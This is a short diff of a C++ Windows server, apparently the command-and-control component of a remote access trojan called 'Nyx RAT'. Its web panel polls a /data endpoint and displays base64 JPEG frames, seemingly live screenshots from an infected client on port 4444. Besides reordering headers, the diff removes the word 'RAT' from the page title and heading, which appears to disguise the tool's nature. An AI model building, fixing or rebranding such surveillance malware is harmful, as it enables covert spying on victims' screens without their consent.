@@ -1,21 +1,22 @@
 // server.cpp
-#include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <windows.h>
 #include <string>
 #include <vector>
 #include <thread>
 #pragma comment(lib, "ws2_32.lib")
+// ... rest stays exactly the same
 
 const int PORT = 5000;  // HTTP port
 const int CLIENT_PORT = 4444;
 
 std::string html = R"(
 <!DOCTYPE html>
-<html><head><title>Nyx RAT</title>
+<html><head><title>Nyx</title>
 <style>body{background:#000;color:#0f0;font-family:monospace;}</style>
 </head><body>
-<h1>Nyx RAT Live</h1>
+<h1>Nyx Live</h1>
 <div id="s"></div>
 <script>
 setInterval(()=>{fetch('/data').then(r=>r.text()).then(d=>{document.getElementById('s').innerHTML = '<img src="data:image/jpeg;base64,'+d+'">';});}, 600);
